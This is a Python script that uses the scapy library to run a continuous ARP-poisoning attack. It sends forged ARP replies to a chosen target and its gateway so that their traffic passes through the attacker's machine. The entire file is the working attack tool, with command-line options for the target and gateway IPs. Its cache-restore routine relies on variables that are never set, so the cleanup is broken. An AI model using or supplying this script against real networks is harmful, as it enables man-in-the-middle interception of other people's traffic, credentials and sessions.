#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
import sys
import threading
from optparse import OptionParser
import time

class ARPING(threading.Thread): # class for arppoison
    def __init__(self,target,gateway):
        threading.Thread.__init__(self)
        self.target = target
        self.gateway = gateway

    def run(self):  
        #print(" ARP Poison in both ways...")
        while 1:    # loop to send arp attack constantly
            try:
                self.spoof()
                print(" sending arp replys in both ways")
            except KeyboardInterrupt:
                print(" Restoring targets")
                time.sleep(5)
                self.restore(self.gatewayMAC, self.targetMAC)

    def spoof(self):    # ffunction that makes arp attack
        targetMAC = mac_grab(self.target)
        gatewayMAC = mac_grab(self.gateway)
        send(ARP(op=2, pdst=self.target, psrc=self.gateway, hwdst=targetMAC))
        send(ARP(op=2, pdst=self.gateway, psrc=self.target, hwdst=gatewayMAC))
	


    def restore(self,gatewayMAC,targetMAC):     # function that restore targets MAC
        send(ARP(op=2, loop=1, pdst=self.gateway, psrc=self.target, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetMAC), count=4)
        send(ARP(op=2, loop=1, pdst=self.target, psrc=self.gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=4)

def mac_grab(IP):   # grabbing hosts MACs
    ans, unans = arping(IP)
    for s, r in ans:
        conf.verb=0
        return r[Ether].src

def main():     # establishing the variables
    parser = OptionParser(usage="%prog: -t [target IP] -g [gateway IP]")
    parser.add_option("-t", "--target", dest="target", help="target IP")
    parser.add_option("-g", "--gateway", dest="gateway", help="gateway IP")

    (options, args) = parser.parse_args()

    if (options.target == None) | (options.gateway == None):    # show parser help message
        parser.print_help() 
        exit(0)

    arppoison = ARPING(options.target, options.gateway) # starting the attack
    arppoison.start()
    conf.verb=0

"""
Main call
"""
if __name__ == '__main__':
    main()
